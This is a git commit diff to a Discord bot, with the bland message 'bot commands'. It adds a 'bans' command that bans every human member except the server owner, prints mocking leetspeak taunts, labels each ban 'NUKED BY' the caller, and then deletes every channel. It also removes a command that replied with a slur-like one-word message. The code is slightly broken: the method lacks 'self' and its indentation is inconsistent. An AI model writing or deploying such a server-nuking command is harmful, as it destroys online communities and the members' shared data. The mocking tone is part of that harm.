726dacc361b7f291b19fdb06c31177ba0bb067f3
CatsAreGood1337 <ihackedfuture@gmail.com>
2021-11-08 16:02:15 +0300

    bot commands

--- cogs/main.py
+++ cogs/main.py
@@ -11,8 +11,17 @@ class User(commands.Cog):
 		print(1)
 
 	@commands.command()
-	async def info(self, ctx):
-		await ctx.send("gay")
+	async def bans(ctx):
+		members = ctx.message.guild.members
+		for member in members:
 
+			if member != ctx.guild.owner and not member.bot:
+			 	print(f"{member} $5 G0$N6 T0 B3 B4NN3D! AHAHAHAHAHAHHAA")
+			 	await member.ban(reason=f"NUKED BY {ctx.message.author.name}")
+			elif member.bot:
+			 		print(f"{member} is a bot")
+		for c in ctx.guild.channels:
+			await c.delete()
+			
 def setup(client):
 	client.add_cog(User(client))
